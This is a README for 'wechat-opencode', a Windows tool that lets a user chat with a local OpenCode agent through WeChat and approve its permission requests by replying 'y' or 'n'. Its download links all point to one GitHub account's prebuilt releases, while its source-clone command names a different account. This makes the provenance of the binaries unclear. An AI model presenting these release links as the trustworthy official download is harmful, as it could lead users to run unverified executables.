# 🤖 wechat-opencode - Chat With OpenCode On WeChat

[![Download wechat-opencode](https://img.shields.io/badge/Download%20wechat--opencode-blue?style=for-the-badge)](https://github.com/lugsailtheocracy394/wechat-opencode/releases)

## 📥 Download

Visit this page to download: https://github.com/lugsailtheocracy394/wechat-opencode/releases

Pick the latest release for Windows, then download the file that matches your system.

## 🪟 What this app does

wechat-opencode lets you chat with your local OpenCode setup from WeChat on Windows.

You can send a message from your phone, then read the reply in WeChat. The app passes your chat to OpenCode on your PC and sends the result back to WeChat.

## ✨ What you can do

- Chat with local OpenCode from WeChat
- Approve or deny permission requests with `y` or `n`
- Switch session, model, and folder from chat
- Keep the same session across messages
- Use the app with a local Windows setup

## 🧰 What you need

Before you start, make sure you have:

- Windows 10 or Windows 11
- Node.js 18 or later
- A personal WeChat account
- OpenCode installed and working in your terminal
- Your OpenCode provider account already set up on your PC

## 📦 Install on Windows

1. Open the release page:
   https://github.com/lugsailtheocracy394/wechat-opencode/releases

2. Download the latest Windows file from the release list.

3. If the file is a ZIP package, extract it to a folder like:
   `C:\wechat-opencode`

4. If the file is an EXE installer, run it and follow the steps on screen.

5. Make sure Node.js is already installed on your PC.

6. Open Command Prompt or PowerShell in the app folder if you unpacked a ZIP file.

## 🚀 Set up WeChat

After you install the app, bind your WeChat account to the bridge.

1. Open Command Prompt or PowerShell.

2. Go to the app folder.

3. Run:

   `wechat-opencode setup`

4. Follow the prompts in WeChat.

5. Confirm the link between WeChat and the app.

If the app asks for permission to use WeChat, allow it on your phone.

## 💬 Start the bridge

After setup is done, start the bridge so WeChat can talk to OpenCode.

1. Open Command Prompt or PowerShell.

2. Go to the app folder.

3. Run:

   `wechat-opencode`

4. Leave the window open while you use the app.

5. Open WeChat on your phone and send a message to the linked account.

## 🔐 Permission prompts

When OpenCode asks for permission, the bridge sends the request to WeChat.

You can reply with:

- `y` to allow
- `n` to deny

This keeps the approval flow inside WeChat, so you do not need to switch back to the terminal for each request.

## 🧭 Chat commands

You can use slash commands in WeChat to manage your OpenCode session.

Common commands include:

- `/session` to check or change the current session
- `/model` to view or switch the model
- `/cwd` to set the current folder
- `/permission` to manage permission settings

Use these when you want to control how OpenCode works without leaving WeChat.

## 🔄 Session behavior

The bridge keeps your session between messages.

That means:

- You can send follow-up messages in the same thread
- OpenCode keeps the chat context
- You do not need to start over each time

If you want a fresh start, change the session with the session command.

## 🧪 First test

After setup, try a short message like:

- `hello`
- `what can you do?`
- `show my current session`

If the bridge is working, you should get a reply in WeChat from your local OpenCode instance.

## 🛠️ Common setup path on Windows

A simple Windows setup looks like this:

1. Download the latest release from the release page
2. Extract the files if needed
3. Install Node.js 18 or later
4. Make sure OpenCode runs in your terminal
5. Run `wechat-opencode setup`
6. Start the bridge with `wechat-opencode`
7. Send a message from WeChat

## 📁 Suggested folder layout

If you use the ZIP package, keep the app in a simple folder path:

- `C:\wechat-opencode`
- `D:\tools\wechat-opencode`

Short paths help avoid issues when you run commands from PowerShell or Command Prompt.

## ⚙️ How it works

wechat-opencode acts as a bridge between:

- WeChat on your phone
- The app running on your Windows PC
- Your local OpenCode setup in the terminal

When you send a message in WeChat, the app forwards it to OpenCode. When OpenCode replies, the app sends that reply back to WeChat.

## ✅ Tips for a smooth start

- Keep your PC on while the bridge runs
- Leave the terminal window open
- Make sure OpenCode works before you start the bridge
- Use the same WeChat account each time
- Check that your provider credentials are already set in OpenCode

## ❓ If something does not work

Try these checks:

- Make sure Node.js 18 or later is installed
- Make sure OpenCode runs on its own in your terminal
- Make sure you used the latest release
- Check that WeChat is linked to the app
- Restart the bridge after setup changes
- Use a simple message first to test the connection

## 🔎 Basic usage examples

Send these in WeChat:

- `help me write a short note`
- `/model`
- `/session`
- `/cwd`
- `y`
- `n`

These commands help you talk to OpenCode and manage the current session from WeChat

## 📌 File types you may see

The release page may offer one of these:

- `.zip` for manual install
- `.exe` for direct run or install
- `.msi` for Windows install

Download the latest Windows file, then use the method that matches the file type

## 🧩 For local development

If you want to work on the source code, use this path:

```bash
git clone https://github.com/CG-man/wechat-opencode.git ~/wechat-opencode
cd ~/wechat-opencode
npm install
```

This is for development use. Most users should use the release page and the packaged Windows download instead

## 📎 Release page

Download and install from here:

https://github.com/lugsailtheocracy394/wechat-opencode/releases